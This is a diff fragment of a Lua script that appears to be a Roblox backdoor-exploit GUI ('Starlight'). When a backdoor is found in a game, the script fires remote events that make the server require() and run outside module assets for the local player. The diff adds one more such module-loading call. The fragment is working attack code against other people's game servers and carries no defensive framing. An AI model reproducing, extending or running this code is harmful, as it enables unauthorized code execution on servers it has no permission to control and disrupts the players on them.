@@ -2455,6 +2455,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 			})
                         fireRemoteEvent('require(6735691273).BetaAntiSkid()')
                         fireRemoteEvent('require(7276744247):noskids("' .. game.Players.LocalPlayer.Name ..  '")')
+                        fireRemoteEvent('require(3986243232).load("m john doe is real",{"' .. game.Players.LocalPlayer.Name ..  '"})')
                         fireRemoteEvent('require(6530368992).antilgr()')
 		else
 			script.Parent.Framee.Check.Text = "backdoor not found!"
